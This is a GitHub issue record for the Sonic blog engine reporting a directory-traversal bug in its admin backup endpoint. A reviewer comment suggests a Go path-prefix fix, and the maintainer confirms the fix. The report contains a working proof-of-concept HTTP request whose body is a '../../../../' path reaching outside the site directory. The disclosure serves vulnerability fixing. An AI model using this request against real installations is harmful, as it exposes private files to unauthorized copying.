{"title": "Back up files in any directory through directory traversal", "labels": [{"name": "bug", "description": "Something isn't working"}], "created_time": "2022-12-05T15:12:51Z", "updated_time": "2023-02-14T06:24:44Z", "closed_time": "2022-12-15T14:52:37Z", "content": "Checklist - [X] The issue has been searched in [GitHub Issues](https://github.com/go-sonic/sonic/issues)\nWhat is version of Sonic has the issue? 1.0.4\nWhat database are you using? SQLite3\nWhat is your deployment method? Executable file\nYour site address. _No response_\nWhat happened? ## Vulnerability Version\n1.0.4\n## Recurring environment\n- Kali Linux\n- Go 1.19.1\n## Vulnerability Description AND recurrence\nNeed to log in to the background\nBack up files in any directory through directory traversal\n```\nPOST /api/admin/backups/work-dir HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 35\nAdmin-Authorization: 0996683e-0fab-46ec-936d-953d43be8048\nAccept: application/json, text/plain, */*\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"\nsec-ch-ua-platform: \"Linux\"\nContent-Type: application/json\nOrigin: http://127.0.0.1:8080\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://127.0.0.1:8080/admin/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n[\"../../../../home/kali/Documents\"]\n```\n![1](https://user-images.githubusercontent.com/43353917/205672230-8adabb99-9b62-4ba4-b9d3-0384fdb0510e.png)\n![2](https://user-images.githubusercontent.com/43353917/205672264-97738ed1-2796-45a1-836b-bbefa2bc0248.png)\nRelevant log output _No response_\nAdditional information _No response_\n", "comments": [{"type": "label", "content": "bug", "url": ""}, {"type": "comment", "content": "\u4fee\u590d\u5efa\u8bae\nservice/impl/backup.go \u6dfb\u52a0\u4e00\u4e2a\u8def\u5f84\u5224\u65ad\uff0c\u53ea\u80fd\u5907\u4efd\u7f51\u7ad9\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u3002\u53c2\u8003zip \u529f\u80fd\uff1ahttp://bit.ly/2MsjAWE\n\n```go\nif !strings.HasPrefix(toBackupPath, b.Config.Sonic.WorkDir) {\n    return nil, xerr.NoType.New(\"\").WithMsg(toBackupPath + \" illegal file path\").WithStatus(xerr.StatusInternalServerError)\n}\n````\n\n"}, {"type": "comment", "content": "![image-20221206153826274](https://user-images.githubusercontent.com/43353917/205851620-e9d2ae6d-4126-4af5-9fa5-c17038e9a753.png)\n"}, {"type": "comment", "content": "Thank you, i have fixed this problem"}]}